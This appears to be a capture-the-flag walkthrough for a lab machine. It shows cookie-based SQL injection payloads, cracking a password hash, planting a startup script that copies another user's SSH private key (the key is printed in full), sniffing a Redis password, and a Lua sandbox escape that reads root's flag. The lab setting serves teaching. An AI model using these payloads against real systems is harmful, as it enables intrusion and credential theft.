![RedPanda.PNG](/assets/Shared/Shared.png)

1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.172
```

2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.172
```

**Output**
```bash
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

3. Visit the web site

![web.PNG](/assets/Shared/web.PNG)
---

You need to buy any product and click on **Proceed to checkout**

![product.PNG](/assets/Shared/product.PNG)


4. Then, with BurpSuite try Inject SQL in the **cookies**, most especific in **custom_cart**

![payment.PNG](/assets/Shared/payment.PNG)

---

![cookie.PNG](/assets/Shared/cookie.PNG)

5. Try with the next sentences:

+ `{"' or 1=0 union select 1,@@version,3-- - ":"1"}`

![version.PNG](/assets/Shared/version.PNG)

---

+ `{"' or 1=0 union select 1,database(),3 -- - ":"1"}`

![db.PNG](/assets/Shared/b.PNG)

---

+ `{"' or 1=0 union select 1,table_name,3 from information_schema.tables where table_schema='checkout'-- - ":"1"}`

![table.PNG](/assets/Shared/table.PNG)

---

+ `{"' or 1=0 union select 1,username,3 from user-- - ":"1"}`

![user.PNG](/assets/Shared/user.PNG)

---

+ `{"' or 1=0 union select 1,password,3 from user-- - ":"1"}`

![password.PNG](/assets/Shared/password.PNG)


6. The password is hashed, use `hash-identifier` yo know the format
```bash
┌──(root㉿est)-[/home/kali]
└─# hash-identifier                                              
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
HASH: fc895d4eddc2fc12f995e18c865cf273
```

**Output**
```bash
Possible Hashs:
[+] MD5
```


7. With john decrypt the hash
```bash
┌──(root㉿est)-[/home/kali]
└─| john --format=raw-md5  -w=/home/kali/Desktop/rockyou.txt hash
```

**Output**

```bash
Soleil101
```


8. With this credentials connect to ssh
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Medium/Shared]
└─| ssh james_mason@10.10.11.172
```


**Output**
```bash
james_mason@shared:~$
```

9. Run this
```bash
james_mason@shared:~$ mkdir -m 777 /opt/scripts_review/profile_default/
james_mason@shared:~$ mkdir -m 777 /opt/scripts_review/profile_default/startup
james_mason@shared:~$ echo "import os;os.system('cat ~/.ssh/id_rsa > ~/dan_smith.key')" > /opt/scripts_review/profile_default/startup/poc.py
```

10. Copy the ssh key and connect to user **dan_smith**

```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Medium/Shared]
└─| cat ke                           
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
> Remember put 600 permision.

11. Connecy to ssh

```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Medium/Shared]
└─| ssh dan_smith@10.10.11.172 -i ke
```

**Output**
```bash
dan_smith@shared:~$ 
```

12. Read a **user flag**
```bash
dan_smith@shared:~$ cat user.txt 
380fab06016fd9471ce85e4db92dcdf6
```


13. Identified the group of user and search for files to try scale privileges
```bash
dan_smith@shared:~$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
dan_smith@shared:~$ find / -group sysadmin 2>/dev/null
/usr/local/bin/redis_connector_dev
```

14. Download **redis_connector_dev** file in our machine

+ Create a server with python
```bash
dan_smith@shared:/usr/local/bin$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

---

+ With **wget** download the file
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Medium/Shared]
└─| wget http://10.10.11.172:8000/redis_connector_dev
```



15. Run the file and listen on port 6379
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Medium/Shared]
└─| ./redis_connector_dev 
[+] Logging to redis instance using password...
```
---
```bash
┌──(root㉿est)-[/home/…/Desktop/Machines/Medium/Shared]
└─| nc -lvnp 6379
listening on [any] 6379 ...
auth
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 35836
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```


16. Run the next commands on Redis
```bash
dan_smith@shared:/usr/local/bin$ redis-cli
127.0.0.1:6379> CONFIG SET requirepass F2WHqJUz2WEz=Gqq
(error) NOAUTH Authentication required.
127.0.0.1:6379> AUTH default F2WHqJUz2WEz=Gqq
OK
```


17. Login on redis-cli with the password

```bash
dan_smith@shared:/usr/local/bin$ redis-cli --pass F2WHqJUz2WEz=Gqq
```


18. Run next commando to get **root flag**

```bash
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /root/root.txt", "r"); local res = f:read("*a"); f:close(); return res' 0
```

**Output**
```bash
"ca5b69ed8354ed3d7cbdcb5591a22d95\n"
```
> Remove **\n** and you get a **root flag**